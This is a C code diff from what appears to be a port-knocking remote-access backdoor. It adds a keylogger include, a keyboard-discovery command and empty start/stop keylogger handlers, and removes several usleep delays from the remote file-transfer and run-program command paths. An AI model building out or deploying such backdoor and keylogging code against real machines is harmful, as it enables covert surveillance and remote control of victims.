@@ -7,6 +7,7 @@
 #include "networking.h"
 
 #ifdef CLIENT_BUILD
+#include "keylogging/keylogger.h"
 #include "process_launcher/process_launcher.h"
 #endif
 
@@ -322,8 +323,6 @@ void process_receive_file(struct session_info * session_info) {
 
     // Send over the filename and the FILENAME command
     send_message(session_info->client_options_->client_fd, session_info->client_options_->knock_source_ip, RECEIVING_PORT, filename);
-
-    usleep(500000);
     send_command(session_info->client_options_->client_fd, session_info->client_options_->knock_source_ip, RECEIVING_PORT, FILENAME);
 
     size_t chunk_count = 0;
@@ -341,10 +340,7 @@ void process_receive_file(struct session_info * session_info) {
 
     fclose(file);
     free(file_buffer);
-
-    usleep(500000);
     send_command(session_info->client_options_->client_fd, session_info->client_options_->knock_source_ip, RECEIVING_PORT, SEND_FILE);
-
 #endif
 
 }
@@ -404,18 +400,30 @@ void handle_disconnect(struct session_info * session_info) {
     connection_loop = false;
 }
 
+// NOLINTNEXTLINE
+void handle_get_keyboards(struct session_info * session_info) {
+#ifdef CLIENT_BUILD
+    discover_keyboards(session_info);
+#endif
+}
+
 /**
  *
  *  CENTRAL MENU COMMAND HANDLERS
  *
 **/
+// NOLINTNEXTLINE
+void send_get_keyboards(struct server_options * server_options) {
+    send_command(server_options->client_fd, server_options->client_ip_address, RECEIVING_PORT, GET_KEYBOARDS);
+}
 
-void send_start_keylogger(int fd) {
+// NOLINTNEXTLINE
+void send_start_keylogger(struct server_options * server_options) {
 
 }
 
-
-void send_stop_keylogger(int fd) {
+// NOLINTNEXTLINE
+void send_stop_keylogger(struct server_options * server_options) {
 
 }
 
@@ -477,8 +485,6 @@ void send_file(struct server_options * server_options) {
 
         // Send over the filename and the FILENAME command
         send_message(server_options->client_fd, server_options->client_ip_address, RECEIVING_PORT, message);
-
-        usleep(500000);
         send_command(server_options->client_fd, server_options->client_ip_address, RECEIVING_PORT, FILENAME);
 
         size_t chunk_count = 0;
@@ -499,8 +505,6 @@ void send_file(struct server_options * server_options) {
     }
 
     free(message);
-
-    usleep(500000);
     send_command(server_options->client_fd, server_options->client_ip_address, RECEIVING_PORT, SEND_FILE);
 
     if (fcntl(STDIN_FILENO, F_SETFL, flags | O_NONBLOCK) == -1) {
@@ -547,8 +551,6 @@ void send_run_program(const struct server_options * server_options) {
 
         // Send over the command and the RUN_PROGRAM command
         send_message(server_options->client_fd, server_options->client_ip_address, RECEIVING_PORT, message);
-
-        usleep(500000);
         send_command(server_options->client_fd, server_options->client_ip_address, RECEIVING_PORT, RUN_PROGRAM);
         fflush(stdout);
     }
@@ -598,13 +600,10 @@ void send_receive_file(const struct server_options * server_options) {
         fflush(stdout);
         // Send over the filename and the FILENAME command
         send_message(server_options->client_fd, server_options->client_ip_address, RECEIVING_PORT, message);
-        usleep(500000);
         send_command(server_options->client_fd, server_options->client_ip_address, RECEIVING_PORT, FILENAME);
     }
 
     free(message);
-
-    usleep(500000);
     send_command(server_options->client_fd, server_options->client_ip_address, RECEIVING_PORT, RECEIVE_FILE);
 
     if (fcntl(STDIN_FILENO, F_SETFL, flags | O_NONBLOCK) == -1) {
